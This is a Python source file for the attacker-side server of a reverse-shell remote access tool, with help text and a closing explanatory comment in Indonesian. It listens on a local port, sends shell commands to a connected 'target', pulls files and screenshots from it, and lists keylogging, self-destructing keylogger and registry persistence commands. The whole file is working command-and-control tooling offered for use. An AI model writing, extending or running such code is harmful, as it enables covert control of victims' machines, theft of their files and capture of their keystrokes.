import socket
import termcolor
import json
import os



def reliable_recv():
    data = ''
    while True:
        try:
            data = data + target.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def reliable_send(data):
    jsondata = json.dumps(data)
    target.send(jsondata.encode())

def upload_file(file_name):
    f = open(file_name, 'rb')
    target.send(f.read())

def download_file(file_name):
    f = open(file_name, 'wb')
    target.settimeout(1)
    chunk = target.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = target.recv(1024)
        except socket.timeout as e:
            break
    target.settimeout(None)
    f.close()


def target_communication():
    count = 0
    while True:
        command = input('* Shell~%s: ' % str(ip))
        reliable_send(command)
        if command == 'quit':
            break
        elif command == 'clear':
            os.system('clear')
        elif command[:3] == 'cd ':
            pass
        elif command[:6] == 'upload':
            upload_file(command[7:])
        elif command[:8] == 'download':
            download_file(command[9:])
        elif command[:10] == 'screenshot':
            f = open('screenshot%d' % (count), 'wb')
            target.settimeout(3)
            chunk = target.recv(1024)
            while chunk:
                f.write(chunk)
                try:
                    chunk = target.recv(1024)
                except socket.timeout as e:
                    break
            target.settimeout(None)
            f.close()
            count += 1
        elif command == 'help':
            print(termcolor.colored('''\n
            quit                                --> Keluar dari sesi dengan target
            clear                               --> Bersihkan Layar
            cd *Directory Name*                 --> Ubah direktori pada system Target
            upload *file name*                  --> Unggah File Ke mesin Target
            download *file name*                --> Unduh mesin Dari mesin target
            keylog_start                        --> Memuali Keyloger
            keylog_dump                         --> Cetak Penekanan Tombol Yang Dimasukkan Target
            keylog_stop                         --> Stop Dan Diri Merusak File Keylogger
            persistence *RegName* *fileName*    --> BUat kegigihan dalam Registri'''),'green')
        else:
            result = reliable_recv()
            print(result)


sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(('192.168.1.4', 5555))
print(termcolor.colored('[+] Mendengarkan Untuk Koneksi', 'green'))
sock.listen(5)
target, ip = sock.accept()
print(termcolor.colored('[+] Target aterhubung Dari: ' + str(ip), 'green'))
target_communication()

# ============================================================================================
# Dalam kode yang Anda berikan, terdapat beberapa perubahan yang perlu diperhatikan. Mari kita lihat beberapa perubahan utama:

# 1. **Perubahan Fungsi `reliable_recv()` dan `reliable_send(data)`**:
#    - Fungsi `reliable_recv()` dan `reliable_send(data)` kini tidak lagi menerima atau memerlukan parameter `target`. Ini karena `target` tidak diambil sebagai parameter fungsi, melainkan dianggap sebagai variabel global.
#    - Kedua fungsi tersebut kini hanya bekerja dengan data yang diterima dan dikirim dalam format JSON. Ini memastikan bahwa data yang dikirim dan diterima dapat diandalkan dan mudah diurai.

# 2. **Perubahan Fungsi `upload_file(file_name)` dan `download_file(file_name)`**:
#    - Fungsi `upload_file(file_name)` dan `download_file(file_name)` kini tidak lagi menerima atau memerlukan parameter `target`. Seperti sebelumnya, `target` dianggap sebagai variabel global.
#    - Kedua fungsi ini kini hanya bekerja dengan nama file yang diterima sebagai argumen.

# 3. **Perubahan Fungsi `target_communication()`**:
#    - Fungsi `target_communication()` juga tidak lagi menerima atau memerlukan parameter `target` atau `ip`. Kedua variabel ini dianggap sebagai variabel global.
#    - Fungsi ini berfungsi sebagai loop utama yang menangani interaksi dengan target. Itu menerima input dari pengguna, mengirimnya ke target, dan menunggu tanggapan.

# 4. **Koneksi Socket**:
#    - Kode sekarang membuat socket dan mengikatnya ke alamat lokal dan port tertentu (`192.168.1.4:5555`). Ini adalah tempat server menunggu koneksi dari target.
#    - Setelah koneksi diterima, kode mencetak pesan bahwa target telah terhubung.

# Dengan demikian, kode ini menciptakan sebuah server yang mendengarkan koneksi dari target, berinteraksi dengan target melalui koneksi tersebut, dan menunggu perintah yang akan dilakukan oleh pengguna. Perubahan desain memastikan bahwa fungsi-fungsi yang terlibat dalam komunikasi dengan target lebih modular dan mudah diatur.
